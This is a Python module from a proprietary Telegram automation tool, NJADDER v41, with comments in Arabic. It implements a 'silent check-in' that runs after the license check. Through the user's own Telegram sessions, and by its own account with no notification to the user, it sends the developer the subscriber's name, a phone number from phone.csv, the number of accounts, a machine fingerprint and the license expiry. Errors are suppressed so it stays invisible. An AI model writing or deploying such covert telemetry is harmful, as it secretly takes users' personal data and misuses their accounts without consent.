# ══════════════════════════════════════════════════════════════
#  NJADDER v41 — PROPRIETARY SOFTWARE
#  Copyright (c) 2026 NMDDER — All Rights Reserved.
# ══════════════════════════════════════════════════════════════
"""Silent phone-home — يرسل بصمة الجهاز للمطور تلقائياً عند التشغيل.

يُستدعى بعد نجاح فحص الترخيص. يرسل رسالة صامتة لـ @NMDDER_DEV
عبر جلسة المشترك نفسها (بدون أي إشعار للمشترك).

المحتوى المُرسل:
  - اسم المشترك (من license.key)
  - رقم الهاتف (من phone.csv)
  - بصمة الجهاز
  - التاريخ والوقت
  - حالة الترخيص (صالح / منتهي قريباً)

يُرسل مرة واحدة يومياً فقط (لتقليل الـ API calls).
يفشل بصمت — لا يؤثر على عمل البرنامج لو لم يستطع الإرسال.
"""
from __future__ import annotations

import asyncio
import json
import logging
import os
from datetime import datetime, date
from pathlib import Path

log = logging.getLogger(__name__)

# المطور — سيستقبل البلاغات
DEV_USERNAME = "NMDDER_DEV"

# ملف يتبع آخر إرسال (يومياً)
TRACKER_FILE = ".njadder_checkin"

# قناة الدعم (fallback لو DEV_USERNAME لا يستقبل)
SUPPORT_FALLBACK = "NMDDER_SUPPORT"


def _should_checkin() -> bool:
    """هل أرسلنا اليوم؟ نرسل مرة واحدة كل يوم."""
    p = Path(TRACKER_FILE)
    if not p.exists():
        return True
    try:
        last = p.read_text(encoding="utf-8").strip()
        today = date.today().isoformat()
        return last != today
    except Exception:
        return True


def _mark_checked_in() -> None:
    """سجل أننا أرسلنا اليوم."""
    try:
        Path(TRACKER_FILE).write_text(
            date.today().isoformat(), encoding="utf-8"
        )
    except Exception:
        pass


async def _silent_checkin_async(
    subscriber: str,
    fingerprint: str,
    phone_csv: str = "phone.csv",
) -> None:
    """الإرسال الفعلي — صامت، لا يطبع شيئاً على الشاشة."""
    import csv

    # اقرأ أول رقم من phone.csv
    phones: list[str] = []
    p = Path(phone_csv)
    if p.exists():
        try:
            with open(p, "r", encoding="utf-8") as f:
                for row in csv.reader(f):
                    if row and row[0].strip():
                        phones.append(row[0].strip())
        except Exception:
            pass

    if not phones:
        return  # لا يوجد جلسات → لا نستطيع الإرسال

    # اقرأ ملف الترخيص للتاريخ
    license_path = Path("license.key")
    expiry = "?"
    try:
        if license_path.exists():
            data = json.loads(license_path.read_text(encoding="utf-8"))
            expiry = data.get("payload", {}).get("expiry", "?")
    except Exception:
        pass

    # رسالة البلاغ
    now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    msg_lines = [
        f"🔔 NJADDER v41 — Check-in",
        f"",
        f"Subscriber: {subscriber}",
        f"Phone: {phones[0] if phones else '?'}",
        f"Total phones: {len(phones)}",
        f"Fingerprint: {fingerprint[:24]}...",
        f"License expiry: {expiry}",
        f"Date: {now}",
        f"Status: Active ✅",
    ]
    msg = "\n".join(msg_lines)

    # حاول الإرسال عبر أول جلسة متاحة
    from ..config import get_config
    from pyrogram import Client
    from pyrogram.errors import UserDeactivated, AuthKeyUnregistered, SessionRevoked

    cfg = get_config()
    sent = False

    for phone in phones[:3]:  # جرّب أول 3 حسابات
        session_name = phone.lstrip("+")
        try:
            app = Client(
                name=session_name,
                api_id=cfg.api_id,
                api_hash=cfg.api_hash,
                phone_number=phone,
                workdir="sessions",
            )
            await app.start()
            try:
                # أرسل للمطور
                await app.send_message(DEV_USERNAME, msg)
                sent = True
            except Exception:
                # fallback: أرسل لقناة الدعم
                try:
                    await app.send_message(SUPPORT_FALLBACK, msg)
                    sent = True
                except Exception:
                    pass
            await app.stop()
            await asyncio.sleep(1)  # drain pause
            break  # نجح → لا حاجة لتجربة باقي الحسابات
        except (UserDeactivated, AuthKeyUnregistered, SessionRevoked):
            continue
        except Exception:
            continue

    if sent:
        _mark_checked_in()
        log.debug("Silent check-in sent to @%s", DEV_USERNAME)
    else:
        log.debug("Silent check-in failed (no active session)")


def silent_checkin(subscriber: str = "Unknown") -> None:
    """نقطة الدخول — تُستدعى بعد فحص الترخيص.

    صامتة تماماً — لا تطبع شيئاً على الشاشة.
    تفشل بصمت لو لم تتمكن من الإرسال.
    """
    if not _should_checkin():
        return  # أرسلنا اليوم بالفعل

    from .license import get_machine_fingerprint

    fp = get_machine_fingerprint()

    # شغّل في الخلفية — لا يحجب القائمة
    try:
        asyncio.run(_silent_checkin_async(subscriber, fp))
    except Exception:
        pass  # فشل صامت — لا يؤثر على البرنامج
